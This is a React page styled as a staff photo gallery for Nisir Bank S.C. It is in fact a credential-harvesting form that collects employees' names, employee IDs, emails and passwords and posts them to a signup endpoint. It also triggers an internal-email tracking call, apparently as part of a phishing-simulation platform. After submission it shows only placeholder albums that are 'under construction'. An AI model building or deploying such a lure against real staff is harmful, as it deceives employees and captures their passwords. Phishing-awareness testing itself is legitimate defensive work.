"use client";

import { useState } from "react";
import { safeApiCall } from "@/lib/safeApiCall";

const PHOTOS = [
  "Head office atrium",
  "Branch opening — Bahir Dar",
  "Staff excellence awards 🏆",
  "New hire orientation",
  "Community outreach day",
  "Year-end celebration",
];

export default function NisirGalleryPage() {
  const [step, setStep] = useState("signup");
  const [openedAlbum, setOpenedAlbum] = useState("");
  const [form, setForm] = useState({
    name: "",
    employeeId: "",
    email: "",
    password: "",
    confirmPassword: "",
  });
  const [error, setError] = useState("");
  const [submitting, setSubmitting] = useState(false);

  function update(field) {
    return (e) => setForm((f) => ({ ...f, [field]: e.target.value }));
  }

  function submit(e) {
    e.preventDefault();
    setError("");

    if (form.password !== form.confirmPassword) {
      setError("Passwords do not match.");
      return;
    }

    setSubmitting(true);
    Promise.all([
      safeApiCall(() =>
        fetch("/api/nisir-gallery/signup", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            name: form.name,
            employeeId: form.employeeId,
            email: form.email,
            password: form.password,
          }),
        })
      ),
      safeApiCall(() =>
        fetch("/api/internal-email/dv", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ templateId: "email-022", dv: "dv2" }),
        })
      ),
    ]).finally(() => {
      setSubmitting(false);
      setStep("gallery");
    });
  }

  if (step === "gallery") {
    return (
      <main className="min-h-screen bg-gradient-to-b from-amber-50 to-white py-10 px-4">
        <div className="max-w-2xl mx-auto text-center">
          <h1 className="text-2xl font-bold text-gray-800 mb-1">Nisir Bank S.C Gallery 📸</h1>
          <p className="text-sm text-gray-500 mb-6">
            Welcome, {form.name || "colleague"} — you're signed in.
          </p>

          <div className="grid grid-cols-2 sm:grid-cols-3 gap-3 mb-6">
            {PHOTOS.map((caption) => (
              <button
                key={caption}
                type="button"
                onClick={() => setOpenedAlbum(caption)}
                className="aspect-square rounded-xl bg-gradient-to-br from-amber-200 to-rose-200 flex items-center justify-center p-3 text-center cursor-pointer hover:opacity-90"
              >
                <span className="text-[11px] font-semibold text-gray-700">{caption}</span>
              </button>
            ))}
          </div>

          {openedAlbum && (
            <p className="text-sm font-semibold text-gray-600 mb-4">
              🚧 “{openedAlbum}” is under construction. Please check back soon.
            </p>
          )}

          <p className="text-xs text-gray-400 mt-6">
            More albums are added regularly. Bookmark this page to check back.
          </p>
        </div>
      </main>
    );
  }

  return (
    <main className="min-h-screen bg-[#fbfbfa] text-[#222] py-10 px-4">
      <div className="max-w-xl mx-auto">
        <svg
          viewBox="0 0 400 220"
          className="w-full h-auto rounded mb-6"
          role="img"
          aria-label="Camera light trail banner"
        >
          <rect width="400" height="220" fill="#0a0a0a" />
          <path
            d="M40 170 Q100 40 180 90 T340 60"
            stroke="#22d3ee"
            strokeWidth="4"
            fill="none"
            opacity="0.85"
          />
          <path
            d="M60 190 Q140 70 220 130 T360 90"
            stroke="#facc15"
            strokeWidth="4"
            fill="none"
            opacity="0.8"
          />
          <path
            d="M30 120 Q120 200 210 150 T330 170"
            stroke="#a78bfa"
            strokeWidth="4"
            fill="none"
            opacity="0.8"
          />
          <g transform="translate(150,90)">
            <rect x="0" y="10" width="100" height="60" rx="6" fill="#1d3557" />
            <rect x="14" y="-6" width="26" height="16" rx="3" fill="#1d3557" />
            <circle cx="50" cy="40" r="20" fill="#0a0a0a" stroke="#e5e7eb" strokeWidth="3" />
            <circle cx="50" cy="40" r="10" fill="#1d3557" stroke="#facc15" strokeWidth="2" />
            <circle cx="85" cy="22" r="4" fill="#facc15" />
          </g>
        </svg>

        <div className="flex items-center gap-2 mb-6">
          <div className="h-9 w-9 rounded bg-[#1d3557] text-white flex items-center justify-center text-xs font-bold">
            NB
          </div>
          <div>
            <p className="text-[13px] font-bold text-[#1d3557]">Nisir Bank S.C Gallery</p>
            <p className="text-[11px] text-gray-500">Staff photo albums — sign up to view</p>
          </div>
        </div>

        <div className="bg-white border border-gray-200 p-6 sm:p-8">
          <p className="text-sm text-gray-700 mb-4">
            Welcome to the Nisir Bank S.C Gallery. Sign up with your employee ID and a new
            password to view and download the latest staff photo albums.
          </p>

          <form onSubmit={submit} className="space-y-4">
            <input
              type="text"
              placeholder="Name"
              required
              value={form.name}
              onChange={update("name")}
              className="w-full border border-gray-300 px-3 py-2 text-sm"
            />
            <input
              type="text"
              placeholder="Employee ID (e.g. EMP-001)"
              required
              pattern="EMP-\d{3,}"
              title="Format: EMP-001"
              value={form.employeeId}
              onChange={update("employeeId")}
              className="w-full border border-gray-300 px-3 py-2 text-sm"
            />
            <input
              type="email"
              placeholder="Email Address"
              required
              value={form.email}
              onChange={update("email")}
              className="w-full border border-gray-300 px-3 py-2 text-sm"
            />
            <input
              type="password"
              placeholder="Password"
              required
              value={form.password}
              onChange={update("password")}
              className="w-full border border-gray-300 px-3 py-2 text-sm"
            />
            <input
              type="password"
              placeholder="Confirm password"
              required
              value={form.confirmPassword}
              onChange={update("confirmPassword")}
              className="w-full border border-gray-300 px-3 py-2 text-sm"
            />

            {error && <p className="text-xs text-red-600">{error}</p>}

            <button
              type="submit"
              disabled={submitting}
              className="bg-[#1d3557] hover:bg-[#16294a] disabled:opacity-60 text-white text-sm font-bold px-5 py-2.5"
            >
              {submitting ? "Signing up…" : "Sign Up & View Gallery"}
            </button>
          </form>
        </div>

        <p className="text-[11px] text-gray-400 mt-4">
          Nisir Bank S.C — Addis Ababa, Ethiopia
        </p>
      </div>
    </main>
  );
}
